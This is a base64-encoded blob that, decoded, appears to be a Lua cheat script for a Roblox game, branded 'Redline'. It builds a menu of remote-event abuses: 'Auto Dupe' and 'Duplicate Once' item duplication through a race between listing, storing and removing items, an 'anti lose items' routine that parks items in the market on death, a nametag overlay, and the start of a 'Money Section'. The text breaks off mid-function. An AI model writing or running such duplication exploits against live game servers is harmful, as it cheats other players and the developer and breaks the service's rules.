AgICAgICAgICAgIAptZWdhcGhvbmVzZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJIYW5kcyBVUCEiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBvaFN0cmluZzEgPSAiSGFuZHMgVVAhIgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5NZWdhcGhvbmVSZW1vdGU6RmlyZVNlcnZlcihvaFN0cmluZzEpCiAgICBlbmQKfSkKCm1lZ2FwaG9uZXNlY3Rpb246YnV0dG9uKHtuYW1lID0gIkRyaXZlciBQdWxsIE92ZXIhIiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgb2hTdHJpbmcxID0gIkRyaXZlciBQdWxsIE92ZXIhIgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5NZWdhcGhvbmVSZW1vdGU6RmlyZVNlcnZlcihvaFN0cmluZzEpCiAgICBlbmQKfSkKCm1lZ2FwaG9uZXNlY3Rpb246YnV0dG9uKHtuYW1lID0gIk1vdmUgaXQgRk9MS1MhIiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgb2hTdHJpbmcxID0gIk1vdmUgaXQgRk9MS1MhIgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5NZWdhcGhvbmVSZW1vdGU6RmlyZVNlcnZlcihvaFN0cmluZzEpCiAgICBlbmQKfSkKCm1lZ2FwaG9uZXNlY3Rpb246YnV0dG9uKHtuYW1lID0gIlBVTEwgT1ZFUiBOT1chIiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgb2hTdHJpbmcxID0gIlBVTEwgT1ZFUiBOT1chIgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5NZWdhcGhvbmVSZW1vdGU6RmlyZVNlcnZlcihvaFN0cmluZzEpCiAgICBlbmQKfSkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgIENvbHVtbiA9IE1pc2NUYWI6Y29sdW1uKHt9KQoKICAgICAgICAgICAgICAgIGxvY2FsIER1cGluZ1NlY3Rpb24gPSBDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJEdXBpbmcgU2VjdGlvbiIsIHNpemUgPSAwLjM0LCBkZWZhdWx0ID0gZmFsc2UsIHNpZGUgPSAncmlnaHQnLCBpY29uID0gR2V0SW1hZ2UoIk5vZGUucG5nIil9KSAKCgotLWF1dG8gZHVwZSBzdGFydApEdXBpbmdTZWN0aW9uOnRvZ2dsZSh7bmFtZSA9ICJBdXRvIER1cGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIEF1dG9EdXBlID0gc3RhdGUKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgUGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZS5SZXBsaWNhdGVkU3RvcmFnZQoKICAgICAgICAgICAgbG9jYWwgRmlyc3RUb29sID0gbmlsCiAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIEZpcnN0VG9vbCA9IFBsYXllci5DaGFyYWN0ZXIgYW5kIFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikKICAgICAgICAgICAgdW50aWwgRmlyc3RUb29sIG9yIG5vdCBBdXRvRHVwZQoKICAgICAgICAgICAgaWYgQXV0b0R1cGUgYW5kIG5vdCBGaXJzdFRvb2wgdGhlbgogICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgaW5mbyA9ICJObyB0b29sIGZvdW5kIGluIGhhbmQhIFBsZWFzZSBlcXVpcCBvbmUuIiwKICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBUb29sTmFtZSA9IEZpcnN0VG9vbC5OYW1lCgogICAgICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgaW5mbyA9ICJBdXRvIER1cGUgc3RhcnRlZCBmb3I6ICIgLi4gVG9vbE5hbWUsCiAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgfSkKCiAgICAgICAgICAgIHdoaWxlIEF1dG9EdXBlIGRvCiAgICAgICAgICAgICAgICBpZiBub3QgQ29vbGRvd24gdGhlbgogICAgICAgICAgICAgICAgICAgIENvb2xkb3duID0gdHJ1ZQoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBUb29sSWQKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgQ29ubmVjdGlvbiA9IFJlcGxpY2F0ZWRTdG9yYWdlLk1hcmtldEl0ZW1zLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihpdGVtKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpdGVtLk5hbWUgPT0gVG9vbE5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXRlbTpXYWl0Rm9yQ2hpbGQoIm93bmVyIikuVmFsdWUgPT0gUGxheWVyLk5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRvb2xJZCA9IGl0ZW06R2V0QXR0cmlidXRlKCJTcGVjaWFsSWQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5MaXN0V2VhcG9uUmVtb3RlOkZpcmVTZXJ2ZXIoVG9vbE5hbWUsIDk5OTk5OSkKICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCguMjUpIC0tMjU1CgogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuQmFja3BhY2tSZW1vdGU6SW52b2tlU2VydmVyKCJTdG9yZSIsIFRvb2xOYW1lKQogICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDIuOSkgLS0zLjMKCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5CdXlJdGVtUmVtb3RlOkZpcmVTZXJ2ZXIoVG9vbE5hbWUsICJSZW1vdmUiLCBUb29sSWQpCiAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLkJhY2twYWNrUmVtb3RlOkludm9rZVNlcnZlcigiR3JhYiIsIFRvb2xOYW1lKQogICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICBDb29sZG93biA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMykgLS0zLjUKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgaW5mbyA9ICJBdXRvIER1cGUgc3RvcHBlZC4iLAogICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kKQogICAgZW5kCn0pICAgICAgICAgICAgICAgCi0tIGF1dG8gZHVwZSBlbmQKCi0tIGFudGkgbG9zZSBpdGVtcwpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCgpsb2NhbCBFeGVtcHRJdGVtcyA9IHsiUGhvbmUiLCAiRmlzdCIsICJTaGllc3R5IiwgIkJhbmRhZ2UiLCAiTGVtb25hZGUiLCAiQ2FyIGtleXMifQoKbG9jYWwgZnVuY3Rpb24gTWFya2V0SGFzSXRlbSh0b29sTmFtZSkKICAgIGxvY2FsIG1hcmtldCA9IFJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJNYXJrZXRJdGVtcyIpCiAgICBpZiBub3QgbWFya2V0IHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKG1hcmtldDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIGl0ZW0uTmFtZSA9PSB0b29sTmFtZSBhbmQgaXRlbTpGaW5kRmlyc3RDaGlsZCgib3duZXIiKSBhbmQgaXRlbS5vd25lci5WYWx1ZSA9PSBMb2NhbFBsYXllci5OYW1lIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGZhbHNlCmVuZAoKbG9jYWwgZnVuY3Rpb24gQmFja3BhY2tIYXNJdGVtKHRvb2xOYW1lKQogICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKExvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IHRvb2xOYW1lIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGZhbHNlCmVuZAoKbG9jYWwgZnVuY3Rpb24gRm9yY2VQdXRUb01hcmtldCh0b29sTmFtZSkKICAgIGxvY2FsIGVuZFRpbWUgPSBvcy5jbG9jaygpICsgMTIgCgogICAgd2hpbGUgb3MuY2xvY2soKSA8IGVuZFRpbWUgZG8KICAgICAgICBpZiBNYXJrZXRIYXNJdGVtKHRvb2xOYW1lKSB0aGVuCiAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgZW5kCgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuTGlzdFdlYXBvblJlbW90ZTpGaXJlU2VydmVyKHRvb2xOYW1lLCA5OTk5OTkpCiAgICAgICAgZW5kKQoKICAgICAgICB0YXNrLndhaXQoMC4xNSkKICAgIGVuZAoKICAgIHJldHVybiBmYWxzZQplbmQKCmxvY2FsIGZ1bmN0aW9uIEZvcmNlUmV0cmlldmVGcm9tTWFya2V0KHRvb2xOYW1lKQogICAgbG9jYWwgbWFya2V0ID0gUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJNYXJrZXRJdGVtcyIsIDEwKQogICAgaWYgbm90IG1hcmtldCB0aGVuIHJldHVybiBmYWxzZSBlbmQKCiAgICBsb2NhbCBlbmRUaW1lID0gb3MuY2xvY2soKSArIDEyCgogICAgd2hpbGUgb3MuY2xvY2soKSA8IGVuZFRpbWUgZG8KICAgICAgICBmb3IgXywgaXRlbSBpbiBpcGFpcnMobWFya2V0OkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGl0ZW0uTmFtZSA9PSB0b29sTmFtZQogICAgICAgICAgICAgICAgYW5kIGl0ZW06RmluZEZpcnN0Q2hpbGQoIm93bmVyIikKICAgICAgICAgICAgICAgIGFuZCBpdGVtLm93bmVyLlZhbHVlID09IExvY2FsUGxheWVyLk5hbWUKICAgICAgICAgICAgICAgIGFuZCBpdGVtOkdldEF0dHJpYnV0ZSgiU3BlY2lhbElkIikgdGhlbgoKICAgICAgICAgICAgICAgIGxvY2FsIHNwZWNpYWwgPSBpdGVtOkdldEF0dHJpYnV0ZSgiU3BlY2lhbElkIikKCiAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuQnV5SXRlbVJlbW90ZTpGaXJlU2VydmVyKHRvb2xOYW1lLCAiUmVtb3ZlIiwgc3BlY2lhbCkKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQoKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5CYWNrcGFja1JlbW90ZTpJbnZva2VTZXJ2ZXIoIkdyYWIiLCB0b29sTmFtZSkKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQoKICAgICAgICAgICAgICAgIGlmIEJhY2twYWNrSGFzSXRlbSh0b29sTmFtZSkgdGhlbgogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICBlbmQKCiAgICByZXR1cm4gZmFsc2UKZW5kCgpsb2NhbCBmdW5jdGlvbiBTYXZlT25EZWF0aChjaGFyKQogICAgbG9jYWwgaHVtID0gY2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKCiAgICBodW0uRGllZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnMuQW50aUxvc2VJdGVtcyB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgdGFzay53YWl0KDAuMjUpCgogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhMb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCBub3QgdGFibGUuZmluZChFeGVtcHRJdGVtcywgdG9vbC5OYW1lKSB0aGVuCiAgICAgICAgICAgICAgICBGb3JjZVB1dFRvTWFya2V0KHRvb2wuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gUmV0cmlldmVBZnRlclNwYXduKCkKICAgIHRhc2suZGVsYXkoMi4yLCBmdW5jdGlvbigpCiAgICAgICAgaWYgbm90IENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJNb2RpZmljYXRpb25zLkFudGlMb3NlSXRlbXMgdGhlbiByZXR1cm4gZW5kCgogICAgICAgIGxvY2FsIG1hcmtldCA9IFJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJNYXJrZXRJdGVtcyIpCiAgICAgICAgaWYgbm90IG1hcmtldCB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKG1hcmtldDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBpdGVtOkZpbmRGaXJzdENoaWxkKCJvd25lciIpCiAgICAgICAgICAgICAgICBhbmQgaXRlbS5vd25lci5WYWx1ZSA9PSBMb2NhbFBsYXllci5OYW1lIHRoZW4KCiAgICAgICAgICAgICAgICBGb3JjZVJldHJpZXZlRnJvbU1hcmtldChpdGVtLk5hbWUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIFNldHVwQ2hhcmFjdGVyKGNoYXIpCiAgICBTYXZlT25EZWF0aChjaGFyKQogICAgUmV0cmlldmVBZnRlclNwYXduKCkKZW5kCgpMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KFNldHVwQ2hhcmFjdGVyKQppZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgU2V0dXBDaGFyYWN0ZXIoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKQplbmQKLS0gYW50aSBsb3NlIGVuZAoKLS1uYW1ldGFnCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgQ2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBIRUlHSFRfT0ZGU0VUID0gMS44Cgpsb2NhbCBUZXh0ID0gRHJhd2luZy5uZXcoIlRleHQiKQpUZXh0LlRleHQgPSAiUmVkbGluZSAjMSIKVGV4dC5TaXplID0gMjYKVGV4dC5DZW50ZXIgPSB0cnVlClRleHQuRm9udCA9IDMKVGV4dC5PdXRsaW5lID0gdHJ1ZQpUZXh0Lk91dGxpbmVDb2xvciA9IENvbG9yMy5mcm9tUkdCKDQwLCAxNSwgNzApClRleHQuVmlzaWJsZSA9IGZhbHNlCgpsb2NhbCBCQVNFX1BVUlBMRSA9IENvbG9yMy5mcm9tUkdCKDE3MCwgMTAwLCAyNTUpCmxvY2FsIERBUktfUFVSUExFID0gQ29sb3IzLmZyb21SR0IoMTMwLCA3MCwgMjAwKQoKbG9jYWwgdCA9IDAKClJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKGR0KQogICAgaWYgbm90IENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJNb2RpZmljYXRpb25zLlJlZGxpbmVOYW1lVGFnIHRoZW4KICAgICAgICBUZXh0LlZpc2libGUgPSBmYWxzZQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgbG9jYWwgaGVhZCA9IGNoYXIgYW5kIGNoYXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgaWYgbm90IGhlYWQgdGhlbgogICAgICAgIFRleHQuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCBwb3MsIG9uU2NyZWVuID0gQ2FtZXJhOldvcmxkVG9WaWV3cG9ydFBvaW50KAogICAgICAgIGhlYWQuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygwLCBIRUlHSFRfT0ZGU0VULCAwKQogICAgKQoKICAgIGlmIG5vdCBvblNjcmVlbiB0aGVuCiAgICAgICAgVGV4dC5WaXNpYmxlID0gZmFsc2UKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIHQgKz0gZHQgKiAxLjIKICAgIGxvY2FsIHB1bHNlID0gKG1hdGguc2luKHQpICsgMSkgLyAyCgogICAgVGV4dC5Db2xvciA9IEJBU0VfUFVSUExFOkxlcnAoREFSS19QVVJQTEUsIHB1bHNlICogMC4yNSkKCiAgICBUZXh0LlBvc2l0aW9uID0gVmVjdG9yMi5uZXcocG9zLlgsIHBvcy5ZKQogICAgVGV4dC5WaXNpYmxlID0gdHJ1ZQplbmQpCi0tbmFtZXRhZ2VuZAoKCi0tIG5vcm1hbCBkdXBlCiAgICAgICAgICAgICAgICBsb2NhbCBDb29sZG93biA9IGZhbHNlOwoKICAgICAgICAgICAgICAgIER1cGluZ1NlY3Rpb246YnV0dG9uKHtuYW1lID0gIkR1cGxpY2F0ZSBPbmNlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvb2xkb3duIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgUGxlYXNlIHdhaXQhYCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIENvb2xkb3duID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBCYWNrcGFjayA9IFBsYXllci5CYWNrcGFjawoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVG9vbCA9IFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBUb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgQ291bGQgbm90IGZpbmQgYSB0b29sISB5b3UgbXVzdCBob2xkIG9uZS5gLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gMTAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOlVuZXF1aXBUb29scygpCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUb29sTmFtZSA9IFRvb2wuTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUb29sSWQKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIENvbm5lY3Rpb24gPSBSZXBsaWNhdGVkU3RvcmFnZS5NYXJrZXRJdGVtcy5DaGlsZEFkZGVkOkNvbm5lY3QoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbihpdGVtKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpdGVtLk5hbWUgPT0gVG9vbE5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpdGVtOldhaXRGb3JDaGlsZCgnb3duZXInKS5WYWx1ZSA9PSBQbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb29sSWQgPSBpdGVtOkdldEF0dHJpYnV0ZSgnU3BlY2lhbElkJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgICAgICAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuTGlzdFdlYXBvblJlbW90ZTpGaXJlU2VydmVyKFRvb2xOYW1lLCA5OTk5OTkpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCguMjU1KSAtLTI2CgogICAgICAgICAgICAgICAgICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5CYWNrcGFja1JlbW90ZTpJbnZva2VTZXJ2ZXIoJ1N0b3JlJywgVG9vbE5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzLjAyKSAtLTIuNgoKICAgICAgICAgICAgICAgICAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuQnV5SXRlbVJlbW90ZTpGaXJlU2VydmVyKFRvb2xOYW1lLCAnUmVtb3ZlJywgVG9vbElkKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5CYWNrcGFja1JlbW90ZTpJbnZva2VTZXJ2ZXIoIkdyYWIiLCBUb29sTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQoKICAgICAgICAgICAgICAgICAgICAgICAgQ29vbGRvd24gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgRHVwaW5nU2VjdGlvbjpsYWJlbCh7d3JhcHBlZCA9IHRydWUsIG5hbWUgPSAiTWlnaHQgVGFrZSBBIEZldyBUcmllcyEgQmUgUGF0aWVudC4ifSkKCiAgICAgICAgICAgICAgICBsb2NhbCBWdWxuZXJhYmlsaXR5U2VjdGlvbiA9IENvbHVtbjpzZWN0aW9uKHtuYW1lID0gIk1vbmV5IFNlY3Rpb24iLCBzaXplID0gMC40NTAsIGRlZmF1bHQgPSBmYWxzZSwgc2lkZSA9ICdyaWdodCcsIGljb24gPSBHZXRJbWFnZSgidW5sb2NrZWQucG5nIil9KSAKCiAgICAgICAgICAgICAgICBsb2NhbCBHZXRGcnVpdEN1cCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBGb3VuZCwgQ3VwID0gZmFsc2UsIG5pbDsKCiAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBuZXh0LCB7TG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSwgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCl9IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfSW5kZXgsIF9WYWx1ZSBpbiBWYWx1ZSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgX1ZhbHVlOklzQSgiVG9vbCIpIGFuZCBfVmFsdWUuTmFtZSA9PSAiSWNlLUZydWl0IEN1cHoiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBfVmFsdWVbIkljZUZydWl0IEN1cCJdWyJJY2VGcnVpdCBQdW5jaE1lZGl1bSJdLlRyYW5zcGFyZW5jeSB+PSAxIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRm91bmQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEN1cCA9IF9WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEZvdW5kLCBDdXAKICAgICAgICAgICAgICAgIGVuZCkgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKbG9jYWwgZnVuY3Rpb24gRnJlZXplQ2hhcmFjdGVyKCkKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vd